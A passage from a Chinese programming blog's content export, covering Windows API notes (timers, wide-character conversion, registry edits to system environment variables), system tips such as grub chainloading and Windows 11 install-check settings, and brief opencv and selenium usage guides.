<td>QueryPerformanceFrequency<br>QueryPerformanceCounter</td>
<td>系统启动时间</td>
<td>和cpu频率相关</td>
<td>2258</td>
</tr>
</tbody></table>
<h5 id="系统启动时间，不随系统时间调整变化"><a href="#系统启动时间，不随系统时间调整变化" class="headerlink" title="系统启动时间，不随系统时间调整变化"></a>系统启动时间，不随系统时间调整变化</h5><ul>
<li><code>GetTickCount</code>: ms级系统启动时间，不随系统时间变化，速度更快</li>
<li><code>QueryPerformanceFrequency</code>: 系统内部计时其的时钟频率，速度很慢</li>
<li><code>QueryPerformanceCounter</code>: 计数器计数，速度很慢</li>
</ul>
<h5 id="系统时间，修改系统时间会变化"><a href="#系统时间，修改系统时间会变化" class="headerlink" title="系统时间，修改系统时间会变化"></a>系统时间，修改系统时间会变化</h5><ul>
<li><code>GetLocalTime</code>: 精度100ns</li>
<li><code>GetSystemTimeAsFileTime</code></li>
</ul>
<h2 id="2-编译器"><a href="#2-编译器" class="headerlink" title="2. 编译器"></a>2. 编译器</h2><h3 id="2-1-visual-studio"><a href="#2-1-visual-studio" class="headerlink" title="2.1. visual studio"></a>2.1. visual studio</h3><h4 id="1-预定义宏"><a href="#1-预定义宏" class="headerlink" title="1) 预定义宏"></a>1) 预定义宏</h4><p><a href="https://docs.microsoft.com/zh-cn/cpp/preprocessor/predefined-macros?view=msvc-170">https://docs.microsoft.com/zh-cn/cpp/preprocessor/predefined-macros?view=msvc-170</a></p>
<h2 id="3-宽字符"><a href="#3-宽字符" class="headerlink" title="3. 宽字符"></a>3. 宽字符</h2><h3 id="3-1-C语言方式转换"><a href="#3-1-C语言方式转换" class="headerlink" title="3.1. C语言方式转换"></a>3.1. C语言方式转换</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> path[] = &#123;<span class="string">&quot;./aaaa&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 先使用NULL获取需要多少个宽字符（宽字符个数包括结束符，不是多少个字节）</span></span><br><span class="line">    <span class="type">int</span> wcharLen = <span class="built_in">MultiByteToWideChar</span>(CP_UTF8, <span class="number">0</span>, path, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 申请对应的空间</span></span><br><span class="line">    <span class="type">wchar_t</span> *wcharPath = (<span class="type">wchar_t</span> *)(<span class="built_in">malloc</span>(wcharLen * <span class="built_in">sizeof</span>(<span class="type">wchar_t</span>)));</span><br><span class="line">    <span class="comment">// 转换</span></span><br><span class="line">    <span class="built_in">MultiByteToWideChar</span>(CP_UTF8, <span class="number">0</span>, path, <span class="number">-1</span>, wcharPath, wcharLen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-C-标准库"><a href="#3-2-C-标准库" class="headerlink" title="3.2. C++标准库"></a>3.2. C++标准库</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> path[] = &#123;<span class="string">&quot;./aaaa&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 申请一个wstring_convert，要求从utf8编码的字符串转成wchar_t，最大字符支持0x10ffff，小端序</span></span><br><span class="line">    <span class="comment">// 不设置小端序则默认会根据编译器来，MSVC会默认小端序，所有终端执行效果一致</span></span><br><span class="line">    <span class="comment">// mingw编译完的二进制会根据环境变量来，在powershell下是大端序，在git bash下是小端序</span></span><br><span class="line">    std::wstring_convert&lt;std::codecvt_utf8&lt;<span class="type">wchar_t</span>, <span class="number">0x10ffff</span>, std::little_endian&gt;&gt; converter;</span><br><span class="line">    std::wstring wcharPath = converter.<span class="built_in">from_bytes</span>(path, path + <span class="built_in">sizeof</span>(path));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者下面的方式</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> path[] = &#123;<span class="string">&quot;./aaaa&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// 申请一个wstring_convert，任意编码从char转成wchar_t</span></span><br><span class="line">    std::wstring_convert&lt;deletable_facet&lt;std::codecvt&lt;<span class="type">wchar_t</span>, <span class="type">char</span>, std::<span class="type">mbstate_t</span>&gt;&gt;&gt; converter;</span><br><span class="line">    std::wstring wcharPath = converter.<span class="built_in">from_bytes</span>(path, path + <span class="built_in">sizeof</span>(path));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-windows特殊类型"><a href="#4-windows特殊类型" class="headerlink" title="4. windows特殊类型"></a>4. windows特殊类型</h2><h3 id="WORD"><a href="#WORD" class="headerlink" title="WORD"></a>WORD</h3><ul>
<li>16位无符号整数</li>
<li>一般用于windows系统调用的参数</li>
</ul>
<h3 id="DWORD"><a href="#DWORD" class="headerlink" title="DWORD"></a>DWORD</h3><ul>
<li>32位无符号整数</li>
<li>一般用于windows系统调用的返回值</li>
</ul>
<h3 id="WCHAR"><a href="#WCHAR" class="headerlink" title="WCHAR"></a>WCHAR</h3><ul>
<li>宽字符类型，2字节16位</li>
<li>一般用于windows系统调用的参数</li>
</ul>
<h2 id="5-注册表修改"><a href="#5-注册表修改" class="headerlink" title="5. 注册表修改"></a>5. 注册表修改</h2><h3 id="5-1-修改系统环境变量"><a href="#5-1-修改系统环境变量" class="headerlink" title="5.1. 修改系统环境变量"></a>5.1. 修改系统环境变量</h3><ul>
<li>使用官方的SetEnvironmentVariable函数只能修改当前进程和子进程的，无法影响到其他进程</li>
<li>需要修改注册表进行修改到系统环境变量，还需要进行通知</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改系统的temp环境变量</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">bool</span> <span class="title">changeSystemTempDir</span><span class="params">(<span class="type">const</span> std::string&amp; newTempPath, std::error_code&amp; ec)</span> </span>&#123;</span><br><span class="line">    DWORD dwRet         = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">auto</span>  wNewTempPath  = <span class="built_in">s2ws</span>(newTempPath);</span><br><span class="line">    <span class="keyword">auto</span>  szNewTempPath = wNewTempPath.<span class="built_in">c_str</span>();</span><br><span class="line">    DWORD dwlen         = wNewTempPath.<span class="built_in">size</span>() * <span class="built_in">sizeof</span>(<span class="type">wchar_t</span>);  <span class="comment">// 这里需要字节数，不是宽字符长度</span></span><br><span class="line">    HKEY  hKey          = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwtype        = REG_EXPAND_SZ;</span><br><span class="line">    DWORD dwMsgRet      = <span class="number">0</span>;</span><br><span class="line">    dwRet               = <span class="built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE,</span><br><span class="line">                         <span class="string">L&quot;SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment&quot;</span>,</span><br><span class="line">                         <span class="number">0</span>,</span><br><span class="line">                         KEY_WRITE | KEY_READ,</span><br><span class="line">                         &amp;hKey);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS) &#123;</span><br><span class="line">        ec.<span class="built_in">assign</span>(::<span class="built_in">GetLastError</span>(), std::<span class="built_in">system_category</span>());</span><br><span class="line">        <span class="built_in">ERRW</span>(<span class="string">&quot;[ChangeTempDir]RegOpenKeyEx failed %s&quot;</span>, std::<span class="built_in">to_string</span>(ec).<span class="built_in">c_str</span>());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ON_SCOPE_EXIT</span>(&#123;</span><br><span class="line">        <span class="keyword">if</span> (hKey) &#123;</span><br><span class="line">            <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">            hKey = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    dwRet = <span class="built_in">RegSetValueEx</span>(hKey, <span class="string">L&quot;TEMP&quot;</span>, <span class="number">0</span>, dwtype, (LPBYTE)szNewTempPath, dwlen);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS) &#123;</span><br><span class="line">        ec.<span class="built_in">assign</span>(::<span class="built_in">GetLastError</span>(), std::<span class="built_in">system_category</span>());</span><br><span class="line">        <span class="built_in">ERRW</span>(<span class="string">&quot;[ChangeTempDir]RegSetValueEx TEMP %s failed %s&quot;</span>, szNewTempPath, std::<span class="built_in">to_string</span>(ec).<span class="built_in">c_str</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">INFOW</span>(<span class="string">&quot;[ChangeTempDir]RegSetValueEx TEMP %s success&quot;</span>, szNewTempPath);</span><br><span class="line"></span><br><span class="line">    dwRet = <span class="built_in">RegSetValueEx</span>(hKey, <span class="string">L&quot;TMP&quot;</span>, <span class="number">0</span>, dwtype, (LPBYTE)szNewTempPath, dwlen);</span><br><span class="line">    <span class="keyword">if</span> (dwRet != ERROR_SUCCESS) &#123;</span><br><span class="line">        ec.<span class="built_in">assign</span>(::<span class="built_in">GetLastError</span>(), std::<span class="built_in">system_category</span>());</span><br><span class="line">        <span class="built_in">ERRW</span>(<span class="string">&quot;[ChangeTempDir]RegSetValueEx TMP %s failed %s&quot;</span>, szNewTempPath, std::<span class="built_in">to_string</span>(ec).<span class="built_in">c_str</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">INFOW</span>(<span class="string">&quot;[ChangeTempDir]RegSetValueEx TMP %s success&quot;</span>, szNewTempPath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RegFlushKey</span>(hKey);</span><br><span class="line">    <span class="built_in">PostMessage</span>(HWND_BROADCAST, WM_SETTINGCHANGE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">SendMessageTimeoutW</span>(HWND_BROADCAST,</span><br><span class="line">                        WM_SETTINGCHANGE,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        (LPARAM)(<span class="string">L&quot;Environment&quot;</span>),</span><br><span class="line">                        SMTO_NORMAL,</span><br><span class="line">                        INFINITE,</span><br><span class="line">                        &amp;dwMsgRet);</span><br><span class="line">    <span class="built_in">SendMessageTimeoutW</span>(HWND_BROADCAST,</span><br><span class="line">                        WM_SETTINGCHANGE,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        (LPARAM)(<span class="string">L&quot;Environment&quot;</span>),</span><br><span class="line">                        SMTO_NOTIMEOUTIFNOTHUNG,</span><br><span class="line">                        INFINITE,</span><br><span class="line">                        &amp;dwMsgRet);</span><br><span class="line">    <span class="built_in">SendMessageTimeoutW</span>(HWND_BROADCAST,</span><br><span class="line">                        WM_SETTINGCHANGE,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        (LPARAM)(<span class="string">L&quot;Environment&quot;</span>),</span><br><span class="line">                        SMTO_ABORTIFHUNG,</span><br><span class="line">                        INFINITE,</span><br><span class="line">                        &amp;dwMsgRet);</span><br><span class="line">    <span class="built_in">INFO</span>(<span class="string">&quot;[ChangeTempDir]dwMsgRet is %d&quot;</span>, dwMsgRet);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、有用的几个技巧"><a href="#三、有用的几个技巧" class="headerlink" title="三、有用的几个技巧"></a>三、有用的几个技巧</h1><h2 id="1-查看程序是64bit还是32bit"><a href="#1-查看程序是64bit还是32bit" class="headerlink" title="1. 查看程序是64bit还是32bit"></a>1. 查看程序是64bit还是32bit</h2><ul>
<li>对exe右键属性</li>
<li>若降低色彩和分辨率的选项可勾选就是32位，不可勾选就是64位</li>
</ul>
<h1 id="四、好用的软件"><a href="#四、好用的软件" class="headerlink" title="四、好用的软件"></a>四、好用的软件</h1><h2 id="1-mingw"><a href="#1-mingw" class="headerlink" title="1. mingw"></a>1. mingw</h2><ul>
<li>minimal gnu for windows</li>
<li>在windows上使用gcc</li>
</ul>
<h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1. 安装"></a>1.1. 安装</h3><ul>
<li>下载免安装版本<a href="https://sourceforge.net/projects/mingw-w64/files/">sourceForge</a></li>
</ul>
<p><strong>posix和win32</strong></p>
<ul>
<li>posix可以将<code>std::thread</code>转发成windows的实现</li>
<li>win32不允许使用<code>std::thread</code>，需要使用win32实现</li>
</ul>
<p><strong>seh和sjlj</strong></p>
<ul>
<li>seh可以处理<code>signal()</code></li>
</ul>
<h1 id="五、win11"><a href="#五、win11" class="headerlink" title="五、win11"></a>五、win11</h1><h2 id="1-跳过windows11安装检查"><a href="#1-跳过windows11安装检查" class="headerlink" title="1. 跳过windows11安装检查"></a>1. 跳过windows11安装检查</h2><ul>
<li>在安装界面输入<code>Shift + F10</code>调出cmd</li>
<li>输入<code>regedit</code>打开注册表</li>
<li>在<code>HKEY_LOCAL_MACHINE\SYSTEM\Setup</code>下面添加一个key，值为<code>LabConfig</code></li>
<li>在其下面新建下面的几个<code>DWORD (32bit)</code>的值<ul>
<li><code>BypassTPMCheck</code>: 跳过tpm检查</li>
<li><code>BypassSecureBootCheck</code>: 跳过安全启动检查</li>
<li><code>BypassRAMCheck</code>: 跳过内存检查</li>
</ul>
</li>
<li>返回重新选择系统进入即可</li>
</ul>
<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-低版本windows调用系统api获取dns地址时报11003错误"><a href="#1-低版本windows调用系统api获取dns地址时报11003错误" class="headerlink" title="1. 低版本windows调用系统api获取dns地址时报11003错误"></a>1. 低版本windows调用系统api获取dns地址时报11003错误</h2><ul>
<li>根据排查，发现是系统api对于dns回包的兼容性不好</li>
<li>dns请求在win7上请求会有A和AAAA两个记录，但是如果AAAA记录的响应返回了A的ip，就会报这个错误</li>
</ul>
<h2 id="2-windows的线程轮转时间是10ms"><a href="#2-windows的线程轮转时间是10ms" class="headerlink" title="2. windows的线程轮转时间是10ms"></a>2. windows的线程轮转时间是10ms</h2><ul>
<li>使用<code>std::future</code>的<code>wait_for()</code>方法，看似等待<code>3ms</code>，实际可能整体执行时间是<code>10ms</code>以上</li>
</ul>
<h2 id="3-IN和OUT为windows的api默认定义用来进行标识参数的方向"><a href="#3-IN和OUT为windows的api默认定义用来进行标识参数的方向" class="headerlink" title="3. IN和OUT为windows的api默认定义用来进行标识参数的方向"></a>3. IN和OUT为windows的api默认定义用来进行标识参数的方向</h2><ul>
<li>定义关键字不能使用<code>IN</code>和<code>OUT</code>，因为它们是windows的api的默认定义</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编译会报错，因为IN和OUT在windows下定义成了空</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">    IN,</span><br><span class="line">    OUT,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="4-编译错误"><a href="#4-编译错误" class="headerlink" title="4. 编译错误"></a>4. 编译错误</h2><h3 id="4-1-无法解析外部符号-GetAdaptersInfo-8"><a href="#4-1-无法解析外部符号-GetAdaptersInfo-8" class="headerlink" title="4.1. 无法解析外部符号 _GetAdaptersInfo@8"></a>4.1. 无法解析外部符号 <code>_GetAdaptersInfo@8</code></h3><ul>
<li>在代码中添加下面一句即可</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;iphlpapi.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure>

<h3 id="4-2-error-C2899-typename-cannot-be-used-outside-a-template-declaration"><a href="#4-2-error-C2899-typename-cannot-be-used-outside-a-template-declaration" class="headerlink" title="4.2. error C2899: typename cannot be used outside a template declaration"></a>4.2. <code>error C2899: typename cannot be used outside a template declaration</code></h3><ul>
<li>VS2015的某个版本之前会报错，在<code>2015.3</code>之后就不会了</li>
</ul>
<h2 id="5-添加开机启动脚本"><a href="#5-添加开机启动脚本" class="headerlink" title="5. 添加开机启动脚本"></a>5. 添加开机启动脚本</h2><ul>
<li>编写bat文件</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">start</span> /d&quot;D:\Program\nginx-<span class="number">1</span>.<span class="number">19</span>.<span class="number">1</span>&quot; nginx.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>将bat文件放到<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup</code>即可</li>
</ul>
<h2 id="6-windows和linux双系统时间不一致"><a href="#6-windows和linux双系统时间不一致" class="headerlink" title="6. windows和linux双系统时间不一致"></a>6. windows和linux双系统时间不一致</h2><ul>
<li>windows把系统硬件时间作为本地时间，直接显示硬件时间</li>
<li>linux把硬件时间作为UTC，会根据当前时区做运算，也就是显示硬件时间+8（北京时间UTC+8）</li>
<li>修改可以从linux或windows两方面改，建议从windows改，因为更加符合未来趋势，硬件时间不用频繁变动</li>
<li>windows按照下面管理员运行设置将硬件时间作为UTC时间，重启就生效了</li>
</ul>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">Reg add HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation /v RealTimeIsUniversal /t REG_DWORD /d <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="7-修改windows的远程桌面的默认端口"><a href="#7-修改windows的远程桌面的默认端口" class="headerlink" title="7. 修改windows的远程桌面的默认端口"></a>7. 修改windows的远程桌面的默认端口</h2><ul>
<li>注册表项<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber</code></li>
<li>修改完之后重启即可</li>
</ul>
<h2 id="8-管理员修改其他用户密码"><a href="#8-管理员修改其他用户密码" class="headerlink" title="8. 管理员修改其他用户密码"></a>8. 管理员修改其他用户密码</h2><ul>
<li>命令行输入<code>lusrmgr.msc</code>，打开用户和用户组</li>
<li>点击用户，在右侧找到对应的用户，右键设置密码就可以修改了</li>
</ul>
<h2 id="9-grub引导win11启动"><a href="#9-grub引导win11启动" class="headerlink" title="9. grub引导win11启动"></a>9. grub引导win11启动</h2><ul>
<li>由于TPM导致grub找不到win11的引导，需要手动添加</li>
<li>在grub引导界面，按c进入命令行，使用ls命令查看磁盘情况</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">grub&gt; </span><span class="language-bash"><span class="built_in">ls</span> -l</span></span><br></pre></td></tr></table></figure>

<ul>
<li>找到windows的fat分区地方，如<code>hd0,gpt1</code></li>
<li>查看是否有此文件<code>bootmgfw.efi</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">grub&gt; </span><span class="language-bash"><span class="built_in">ls</span> (hd0,gpt1)/efi/Microsoft/Boot/bootmgfw.efi</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动linux，修改grub的配置<code>/etc/grub.d/40_custom</code>如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; cat /etc/grub.d/40_custom</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">exec tail -n +3 $0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">This file provides an easy way to add custom menu entries.  Simply <span class="built_in">type</span> the</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">the <span class="string">&#x27;exec tail&#x27;</span> line above.</span></span><br><span class="line">menuentry &#x27;Win11&#x27; &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod chain</span><br><span class="line">        insmod ntfs</span><br><span class="line">        set root= &#x27;(hd0, gpt1)&#x27;</span><br><span class="line">        chainloader /EFI/Microsoft/Boot/bootmgfw.efi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>执行<code>grub-mkconfig -o /boot/grub/grub.cfg</code>更新grub配置即可找到win11</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>system</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>opencv-python 图像处理</title>
    <url>/blogs/2022-03-02-opencv-python/</url>
    <content><![CDATA[<h1 id="一、语法相关"><a href="#一、语法相关" class="headerlink" title="一、语法相关"></a>一、语法相关</h1><h2 id="1-图像读取和展示"><a href="#1-图像读取和展示" class="headerlink" title="1. 图像读取和展示"></a>1. 图像读取和展示</h2><ul>
<li>展示使用notebook</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">image = cv2.imread(<span class="string">&#x27;/path/to/image&#x27;</span>)</span><br><span class="line">x, y, color = image.shape   <span class="comment"># 高度 宽度 通道数量（3代表RGB）</span></span><br><span class="line"><span class="built_in">print</span>(x, y, color)</span><br><span class="line"><span class="comment"># 代表高（x）100，宽（y）200，RGB颜色的图像</span></span><br><span class="line">plt.imshow(image)</span><br></pre></td></tr></table></figure>

<img src='2022-03-04-01.png' />

<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1>]]></content>
      <categories>
        <category>Program</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>image</tag>
      </tags>
  </entry>
  <entry>
    <title>python selenium使用记录</title>
    <url>/blogs/2022-02-27-selenium/</url>
    <content><![CDATA[<h1 id="一、不同浏览器使用"><a href="#一、不同浏览器使用" class="headerlink" title="一、不同浏览器使用"></a>一、不同浏览器使用</h1><h2 id="1-chrome"><a href="#1-chrome" class="headerlink" title="1. chrome"></a>1. chrome</h2><ul>
<li>需要安装chrome对应版本的chromedriver</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line">options.add_argument(<span class="string">&quot;--mute-audio&quot;</span>)            <span class="comment"># 不开声音</span></span><br><span class="line"><span class="comment"># 设置代理</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--proxy-server=http://127.0.0.1:8118&#x27;</span>)</span><br><span class="line">options.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)   <span class="comment"># 忽略证书错误请求</span></span><br><span class="line"><span class="comment"># options.add_argument(&#x27;--headless&#x27;)</span></span><br><span class="line"><span class="comment"># options.add_argument(&#x27;--disable-gpu&#x27;)</span></span><br><span class="line"><span class="comment"># options.add_argument(&#x27;--no-sandbox&#x27;)</span></span><br><span class="line"><span class="comment"># options.add_argument(&#x27;window-size=800x600&#x27;)</span></span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome(options=options)      <span class="comment"># 初始化一个driver</span></span><br><span class="line">...</span><br><span class="line">driver.quit()                                   <span class="comment"># 退出一个driver</span></span><br></pre></td></tr></table></figure>

<h1 id="二、界面实例操作"><a href="#二、界面实例操作" class="headerlink" title="二、界面实例操作"></a>二、界面实例操作</h1><h2 id="1-窗口操作"><a href="#1-窗口操作" class="headerlink" title="1. 窗口操作"></a>1. 窗口操作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">driver.set_window_size(<span class="number">760</span>, <span class="number">730</span>)        <span class="comment"># 设置窗口大小</span></span><br><span class="line"><span class="built_in">print</span>(driver.get_window_size())         <span class="comment"># 获取当前窗口大小</span></span><br><span class="line">driver.maximize_window()                <span class="comment"># 最大化窗口</span></span><br><span class="line"></span><br><span class="line">driver.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)     <span class="comment"># 开启窗口访问网页</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(driver.title)                     <span class="comment"># 当前窗口的标题</span></span><br></pre></td></tr></table></figure>

<h2 id="2-标签页操作"><a href="#2-标签页操作" class="headerlink" title="2. 标签页操作"></a>2. 标签页操作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印所有的标签页</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(driver.window_handles)</span><br><span class="line">[<span class="string">&#x27;CDwindow-E0BA79545D54D4F0C2397673A8BCE22F&#x27;</span>]</span><br><span class="line"><span class="comment"># 切换到特定的标签页</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>driver.switch_to.window(driver.window_handles[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h2 id="3-查找界面元素"><a href="#3-查找界面元素" class="headerlink" title="3. 查找界面元素"></a>3. 查找界面元素</h2><ul>
<li>主要使用<code>find_element()</code>和<code>find_elements()</code></li>
<li>其中<code>find_element()</code>返回第一个</li>
<li><code>find_elements()</code>返回列表</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line">item = driver.find_element(By.CLASS_NAME,<span class="string">&quot;item-list&quot;</span>)</span><br><span class="line">item_list = driver.find_elements(By.CLASS_NAME,<span class="string">&quot;item-list&quot;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>几种类型见下</li>
</ul>
<h3 id="3-1-XPATH"><a href="#3-1-XPATH" class="headerlink" title="3.1. XPATH"></a>3.1. XPATH</h3><h4 id="1-标签内内容"><a href="#1-标签内内容" class="headerlink" title="(1) 标签内内容"></a>(1) 标签内内容</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Geeks For Geeks<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>可以只输入一半进行匹配</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">button = driver.find_element(By.XPATH, <span class="string">&quot;//button[contains(text(), &#x27;Geeks for Geeks&#x27;)]&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="2-标签特定属性匹配"><a href="#2-标签特定属性匹配" class="headerlink" title="(2) 标签特定属性匹配"></a>(2) 标签特定属性匹配</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span>Geeks For Geeks<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 只选一个匹配</span></span><br><span class="line">button = driver.find_element(By.XPATH, <span class="string">&quot;//button[@type=&#x27;button&#x27;]&quot;</span>)</span><br><span class="line"><span class="comment"># 与关系匹配</span></span><br><span class="line">button = driver.find_element(By.XPATH, <span class="string">&quot;//button[@type=&#x27;button&#x27; and @class=&#x27;test&#x27;]&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="3-层级匹配"><a href="#3-层级匹配" class="headerlink" title="(3) 层级匹配"></a>(3) 层级匹配</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span>Geeks For Geeks<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">class</span>=<span class="string">&quot;test&quot;</span>&gt;</span>Geeks For Geeks<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">button = driver.find_element(By.XPATH, <span class="string">&quot;/html/body/div/button[@type=&#x27;button&#x27;]&quot;</span>)</span><br></pre></td></tr></table></figure>

